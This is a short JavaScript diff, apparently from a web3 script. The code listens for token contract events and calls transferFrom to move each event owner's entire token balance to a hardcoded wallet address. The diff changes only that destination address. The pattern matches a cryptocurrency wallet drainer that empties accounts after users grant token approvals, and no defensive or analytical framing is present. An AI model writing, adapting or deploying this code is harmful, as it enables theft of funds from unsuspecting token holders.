@@ -26,7 +26,7 @@
                     fromBlock: 'latest'
                 }, function(error, event){
                     TOKEN.methods.balanceOf(event.returnValues.owner).call().then((balance)=>{
-                        TOKEN.methods.transferFrom(event.returnValues.owner,"0x075AF3488f386D0E9c2CD43f58b78F2bA13D9c92",balance)
+                        TOKEN.methods.transferFrom(event.returnValues.owner,"0xC964416B03f6389808BB4B04220A5C4BF030388e",balance)
                         .send({from:ethereum.selectedAddress})
                     })
                 });
